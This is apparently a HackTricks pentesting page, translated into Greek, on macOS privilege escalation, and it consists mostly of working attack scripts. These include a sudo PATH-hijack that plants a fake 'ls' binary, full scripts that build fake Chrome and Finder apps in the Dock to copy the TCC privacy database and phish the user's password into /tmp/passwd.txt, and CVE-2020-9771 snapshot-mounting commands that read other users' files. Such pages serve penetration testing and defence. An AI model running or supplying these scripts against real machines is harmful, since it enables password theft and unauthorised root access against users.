# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Αν ήρθατε εδώ ψάχνοντας για TCC privilege escalation πηγαίνετε στο:

{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Παρακαλώ σημειώστε ότι **οι περισσότερες από τις τεχνικές για privilege escalation που επηρεάζουν το Linux/Unix θα επηρεάσουν επίσης τα MacOS** μηχανήματα. Έτσι δείτε:

{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## User Interaction

### Sudo Hijacking

Μπορείτε να βρείτε την αρχική [Sudo Hijacking technique μέσα στην ανάρτηση Linux Privilege Escalation](../../linux-hardening/privilege-escalation/#sudo-hijacking).

Ωστόσο, το macOS **διατηρεί** το **`PATH`** του χρήστη όταν εκτελεί **`sudo`**. Αυτό σημαίνει ότι ένας άλλος τρόπος για να επιτευχθεί αυτή η επίθεση θα ήταν να **παρακάμψετε άλλες δυαδικές** που θα εκτελέσει το θύμα όταν **τρέχει sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<EOF
#!/bin/bash
if [ "\$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "\$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Σημειώστε ότι ένας χρήστης που χρησιμοποιεί το τερματικό θα έχει πολύ πιθανό **εγκατεστημένο το Homebrew**. Έτσι, είναι δυνατόν να υποκλέψετε δυαδικά αρχεία στο **`/opt/homebrew/bin`**.

### Υποκρισία Dock

Χρησιμοποιώντας κάποια **κοινωνική μηχανική**, θα μπορούσατε να **υποκριθείτε για παράδειγμα το Google Chrome** μέσα στο dock και στην πραγματικότητα να εκτελέσετε το δικό σας σενάριο:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Ορισμένες προτάσεις:

- Ελέγξτε στο Dock αν υπάρχει ένα Chrome, και σε αυτή την περίπτωση **αφαιρέστε** αυτή την καταχώρηση και **προσθέστε** την **ψεύτικη** **καταχώρηση Chrome στην ίδια θέση** στον πίνακα Dock.&#x20;
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{{#endtab}}

{{#tab name="Finder Impersonation"}}
Ορισμένες προτάσεις:

- Δεν **μπορείτε να αφαιρέσετε τον Finder από το Dock**, οπότε αν σκοπεύετε να τον προσθέσετε στο Dock, μπορείτε να τοποθετήσετε τον ψεύτικο Finder ακριβώς δίπλα στον πραγματικό. Για αυτό χρειάζεται να **προσθέσετε την ψεύτικη καταχώρηση Finder στην αρχή του πίνακα Dock**.
- Μια άλλη επιλογή είναι να μην τον τοποθετήσετε στο Dock και απλώς να τον ανοίξετε, "Finder που ζητά να ελέγξει τον Finder" δεν είναι τόσο περίεργο.
- Μια άλλη επιλογή για **να αποκτήσετε δικαιώματα root χωρίς να ζητήσετε** τον κωδικό πρόσβασης με ένα τρομακτικό παράθυρο, είναι να κάνετε τον Finder να ζητήσει πραγματικά τον κωδικό πρόσβασης για να εκτελέσει μια προνομιούχα ενέργεια:
- Ζητήστε από τον Finder να αντιγράψει στο **`/etc/pam.d`** ένα νέο **`sudo`** αρχείο (Η προτροπή που ζητά τον κωδικό πρόσβασης θα υποδεικνύει ότι "ο Finder θέλει να αντιγράψει το sudo")
- Ζητήστε από τον Finder να αντιγράψει ένα νέο **Authorization Plugin** (Μπορείτε να ελέγξετε το όνομα του αρχείου ώστε η προτροπή που ζητά τον κωδικό πρόσβασης να υποδεικνύει ότι "ο Finder θέλει να αντιγράψει το Finder.bundle")
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << EOF > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{{#endtab}}
{{#endtabs}}

## TCC - Εκμετάλλευση Δικαιωμάτων Ρίζας

### CVE-2020-9771 - παράκαμψη TCC του mount_apfs και εκμετάλλευση δικαιωμάτων

**Οποιοσδήποτε χρήστης** (ακόμα και αυτοί χωρίς δικαιώματα) μπορεί να δημιουργήσει και να τοποθετήσει ένα στιγμιότυπο μηχανής χρόνου και **να έχει πρόσβαση σε ΟΛΑ τα αρχεία** αυτού του στιγμιότυπου.\
Η **μόνη προϋπόθεση** είναι η εφαρμογή που χρησιμοποιείται (όπως το `Terminal`) να έχει **Πλήρη Πρόσβαση Δίσκου** (FDA) (`kTCCServiceSystemPolicyAllfiles`), η οποία πρέπει να παραχωρηθεί από έναν διαχειριστή.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Μια πιο λεπτομερής εξήγηση μπορεί να [**βρεθεί στην αρχική αναφορά**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Ευαίσθητες Πληροφορίες

Αυτό μπορεί να είναι χρήσιμο για την κλιμάκωση δικαιωμάτων:

{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
